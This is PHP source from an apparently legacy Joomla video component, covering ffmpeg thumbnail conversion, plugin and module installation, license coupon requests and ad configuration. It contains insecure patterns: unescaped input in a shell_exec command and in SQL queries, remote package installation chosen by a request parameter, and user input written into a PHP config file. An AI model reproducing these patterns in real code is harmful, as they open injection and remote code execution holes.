				$execresult=shell_exec("$ffmpegpreexec  $ffmpegpath -i $localvidcode -y -f mjpeg  -s $setthumbdimensions -ss 1 -vframes 1 -an $thumbnailoutput");	
					
					
				$thumbnailoutput=str_replace($mosConfig_absolute_path, $mosConfig_live_site,$thumbnailoutput );		
				$outputvcode=str_replace($mosConfig_absolute_path, $mosConfig_live_site, $outputvcode );
				
				$database->setQuery("UPDATE #__seyret_items SET videoservercode='$outputvcode', picturelink='$thumbnailoutput' WHERE id='$vidid'");
	if (!$database->query()){
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
	}
					
				
				}
				exit;
				mosRedirect( "index2.php?option=com_seyret", "Batch Conversion Finished");
}






function seyretplugins(){
global $mosConfig_absolute_path;

require($mosConfig_absolute_path."/components/com_seyret/includes/classes/installer.class.php");
require( $mosConfig_absolute_path . '/includes/domit/xml_domit_include.php' );



		HTML_seyret::htmlseyretplugins();

/* 
$newinstall=new seyretinstaller();
$newinstall->downloadcode="98767882765356728276671265633";
//$newinstall->installthezip();
$newinstall->getandinstall(); 
*/
	

}



function getpackage(){
global $mosConfig_absolute_path;

require($mosConfig_absolute_path."/components/com_seyret/includes/classes/installer.class.php");

$downloadcode = mosGetParam($_REQUEST,'downloadcode',null);


$newinstall=new seyretinstaller();
$newinstall->downloadcode=$downloadcode;
//$newinstall->installthezip();
$newinstall->getandinstall(); 

mosRedirect( "index2.php?option=com_seyret&task=seyretplugins");

}



function tryinstallingmodules(){
		
		global $database;
		
		
		if (class_exists("JModuleHelper")){//1.5 compatibility

		
		} else {
			//add seyretmods to modules table
			$database->setQuery("SELECT count(*) FROM #__template_positions");
			$total = $database->loadResult(); //line count
			
			if ($total>0){
				$database->setQuery("SELECT count(*) FROM #__template_positions WHERE position='seyretmod1'");
				$total = $database->loadResult(); //line count	
				if ($total==0){
					for ($i=1; $i<10; $i++){
					$mod="seyretmod".$i;
						$database->setQuery("INSERT INTO #__template_positions VALUES ('','".$mod."','')");
						$database->loadObjectList();
					}
			
				}
				//install modules.
				$database->setQuery("SELECT count(*) FROM #__modules WHERE module='mod_seyret_aio'");
				$totalmod = $database->loadResult();
				if ($totalmod==0){
					$modphp=$mosConfig_absolute_path."/administrator/components/com_seyret/repos/mod_seyret_aio.php";
					$modphpdest=$mosConfig_absolute_path."/modules/mod_seyret_aio.php";
					$modxml=$mosConfig_absolute_path."/administrator/components/com_seyret/repos/mod_seyret_aio.xmlsyr";
					$modxmldest=$mosConfig_absolute_path."/modules/mod_seyret_aio.xml";
					@copy ($modphp,$modphpdest);
					@copy ($modxml,$modxmldest);
					
					if (file_exists($modphpdest) AND file_exists($modxmldest)){
						$database->setQuery("INSERT INTO #__modules VALUES ('','Seyret All In One','','1','seyretmod1','0','0000-00-00 00:00:00','1','mod_seyret_aio','0','0','1','','0','0')");
						$database->loadObjectList();

						$database->setQuery("SELECT * FROM #__modules WHERE module='mod_seyret_aio'");
							$mod = $database->loadObjectList();
							foreach ($mod as $mod) {
								$moduleid = $mod->id;
							}
							

						
						
						$database->setQuery("INSERT INTO #__modules_menu VALUES ('$moduleid','0')");
						$database->loadObjectList();
					
					
					}
				
				}
		
				

			}
		}
				
				
				
		
		
}




function requestcouponcodetomove(){
global $database, $mosConfig_live_site;
		
		
		$database->setQuery("SELECT * FROM #__seyret_check"); 		
		$check = $database->loadObjectList();
		foreach ($check as $check) 
		{		
			$joomlaalemuserid=$check->joomlaalemuserid;	
			$securitycode1=$check->securitycode1;
			$securitycode2=$check->securitycode2;
		}
		
		
			$siteforjoomlaalem=$mosConfig_live_site;
			$siteforjoomlaalem = str_replace( "www.", "", $siteforjoomlaalem );
			$siteforjoomlaalem = str_replace( "https://", "http://", $siteforjoomlaalem );
			
			$dbversionforjoomlaalem=str_replace( ".", "__", $dbversion );
			$sitelanguage=str_replace( ".", "__", $mosConfig_locale );
			$siteforjoomlaalem = str_replace( ".", "__", $siteforjoomlaalem );
			$siteforjoomlaalem = str_replace( "/", "25ja25", $siteforjoomlaalem );
			$siteforjoomlaalem = str_replace( ":", "1twodots1", $siteforjoomlaalem );

			
			
		$link="http://www.joomla-alem.com/index2.php?option=com_joomlaalem&no_html=1&task=requestcouponcodetomove&siteinfo=".$siteforjoomlaalem."&jalemuserid=".$joomlaalemuserid."&securitycode1=".$securitycode1."&securitycode2=".$securitycode2;
	
		$str=jalem_file_get_contents($link);
		
		HTML_seyret::htmlrequestcouponcode($str);		


}


function submitprocoupon(){
global $database, $mosConfig_live_site;

$couponcode = mosGetParam( $_REQUEST, 'couponcode', null);
		
		$database->setQuery("SELECT * FROM #__seyret_check"); 		
		$check = $database->loadObjectList();
		foreach ($check as $check) 
		{		
			$joomlaalemuserid=$check->joomlaalemuserid;	
			$securitycode1=$check->securitycode1;
		}
		
		
			$siteforjoomlaalem=$mosConfig_live_site;
			$siteforjoomlaalem = str_replace( "www.", "", $siteforjoomlaalem );
			$siteforjoomlaalem = str_replace( "https://", "http://", $siteforjoomlaalem );
			
			$dbversionforjoomlaalem=str_replace( ".", "__", $dbversion );
			$sitelanguage=str_replace( ".", "__", $mosConfig_locale );
			$siteforjoomlaalem = str_replace( ".", "__", $siteforjoomlaalem );
			$siteforjoomlaalem = str_replace( "/", "25ja25", $siteforjoomlaalem );
			$siteforjoomlaalem = str_replace( ":", "1twodots1", $siteforjoomlaalem );

			
			
		$link="http://www.joomla-alem.com/index2.php?option=com_joomlaalem&no_html=1&task=useseyretcoupon&siteinfo=".$siteforjoomlaalem."&jalemuserid=".$joomlaalemuserid."&securitycode1=".$securitycode1."&seyretcoupon=".$couponcode;
	
		$str=jalem_file_get_contents($link);
		
		mosRedirect( "index2.php?option=com_seyret", $str);

}



function entersc2(){
		HTML_seyret::htmlentersc2();
}



function submitsc2(){
global $database;

		$sc2 = mosGetParam($_POST,'sc',null);

		$database->setQuery("UPDATE #__seyret_check SET securitycode2='$sc2'");
			if (!$database->query()){
				echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
				exit();
			}	
			

		mosRedirect( "index2.php?option=com_seyret");
}



function getdashboard(){


global $database, $mosConfig_live_site,$mosConfig_locale, $mosConfig_absolute_path, $mosConfig_lang;
	


		
	$database->setQuery("SELECT * FROM #__seyret_check"); 		
	$check = $database->loadObjectList();
	foreach ($check as $check) 
	{
		$dbversion = $check->dbversion;			
		$joomlaalemuserid=$check->joomlaalemuserid;	
		$seyretpro = $check->seyretpro;	
		$prophpdate = $check->prophpdate;	
		$securitycode1 = $check->securitycode1;
		$securitycode2 = $check->securitycode2;		
	}
	
	
	require_once($mosConfig_absolute_path."/administrator/components/com_seyret/seyret_version.php");
	require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php'); 

$messg=getjhmessage();	
$promessage=procheck($joomlaalemuserid, $prophpdate, $securitycode1, $securitycode2);

$jhmessages=seyretfindit($messg, "jhmessages");
$latestversion=seyretfindit($messg, "latestversion");	



	$image_lang_dir=$mosConfig_lang;
	$image_lang_dir_address=$mosConfig_absolute_path."/components/com_seyret/themes/".$theme."/images/".$image_lang_dir;
	if (!is_dir($image_lang_dir_address))
	{
		$image_lang_dir="english";
	}	
	

	
	
echo "
<dashboard>

	<langdef>
		<proapprovedlabellang>"._PROSTATUSLABEL."</proapprovedlabellang>
		<jhuidlang>"._JHUSERID."</jhuidlang>
		<proapprovedlang>"._FLAPROAPPROVED."</proapprovedlang>
		<notprolang>"._FLANOTPRO."</notprolang>
		<systemlang>"._SYSTEMINFOL."</systemlang>		
		<prodeflang>"._PRODEFINITIONS."</prodeflang>
		<prodefuptodatelang>"._PRODEFINITIONSUPTODATE."</prodefuptodatelang>
		<prodefoutdatedlang>"._PRODEFINITIONSOUTDATED."</prodefoutdatedlang>
		<prodefnotprolang>"._PRODEFINITIONSNOTPRO."</prodefnotprolang>
		<prodefscneedlang>"._SECNEEDED."</prodefscneedlang>
		<tosheaderlang>"._FLATERMSOFUSE."</tosheaderlang>
		<yourversionlang>"._YOURVERSION."</yourversionlang>
		<latestversionlang>"._LATESTVERSION."</latestversionlang>
		<jhmessagelang>"._JH_MESSAGES."</jhmessagelang>
		<prodefconnerrlang>"._CONNERROR."</prodefconnerrlang>
		<sthemelang>"._SEYRETTHEME."</sthemelang>
		<buttonpacklang>"._SBUTTONPACK."</buttonpacklang>
		<hofamelang>"._HALLOFFAME."</hofamelang>
		<sponsortflang>"._VERSIONSPONSOR."</sponsortflang>
		
		

		
	</langdef>

	<procheck>
		".$promessage."
		<jhuid>".$joomlaalemuserid."</jhuid>
		<latestversion>".$latestversion."</latestversion>
		<installedversion>".$seyretversion."</installedversion>
		<installedversionname>".$seyretversionname."</installedversionname>
		<installedversionstat>".$seyretversionstatus."</installedversionstat>
		<stheme>".$theme."</stheme>
		<buttonpack>".$image_lang_dir."</buttonpack>

		
		
		


	</procheck>

	<jhmessages>
		<jhmsg>".$jhmessages."</jhmsg>

	</jhmessages>
	
					

</dashboard>


";

}





function longtailads(){
		HTML_seyret::htmllongtail();

}




function submitlongtailcode(){
global $mosConfig_absolute_path;



	if (class_exists("JRequest")) {
		$longtailcoderaw=JRequest::getVar('longtailcode', '' ,'post' , 'string', 2); 


	
	} else {
		$longtailcoderaw=mosGetParam( $_POST, 'longtailcode', null, _MOS_ALLOWHTML );
		

	}
	
	
	$longtailcoderaw=str_replace( "\\", "", $longtailcoderaw );
	$longtailcodesplit=explode('?',$longtailcoderaw);
	$queriesarray=explode('&',$longtailcodesplit[1]);
	

	
	
	foreach ($queriesarray as $query) {
		if (substr($query, 0, 1) == "d") {
			$queryvalue=explode('=', $query);
			$d=$queryvalue[1];
			echo "d:".$d;
		}

		if (substr($query, 0, 1) == "s") {
			$queryvalue=explode('=', $query);
			$s=$queryvalue[1];
			echo "s:".$s;
		}
		
		
		if (substr($query, 0, 1) == "c") {
			$queryvalue=explode('=', $query);
			$c=$queryvalue[1];
			echo "c:".$c;
		}		

		if (substr($query, 0, 1) == "v") {
			$queryvalue=explode('=', $query);
			$v=$queryvalue[1];
			$v=str_replace( "\"", "", $v );
			$v=str_replace( "></script>", "", $v );
			
			
			
			echo "v:".$v;
		}
	}
	
	
	//SET CONFIG TEXT
	$configtxt = "<?php\n";
	$configtxt .= "\$d = \"$d\";\n";
	$configtxt .= "\$s = \"$s\";\n";
	$configtxt .= "\$c = \"$c\";\n";
	$configtxt .= "\$v = \"$v\";\n";
	$configtxt .= "?>";
	
	
	echo $configtxt;

	
	
	$configfile=$mosConfig_absolute_path."/administrator/components/com_seyret/longtail_config.php";
	
		//WRITE CONFIG
	if ( $fp = fopen( $configfile, "w" ) ) {
		fwrite( $fp, $configtxt );
		fclose ( $fp );
		mosRedirect( "index2.php?option=com_seyret&task=longtailads", _CONFIG_OK );
	} else {
		mosRedirect( "index2.php?option=com_seyret&task=longtailads", _CONFIG_ERR );
	}

}

?>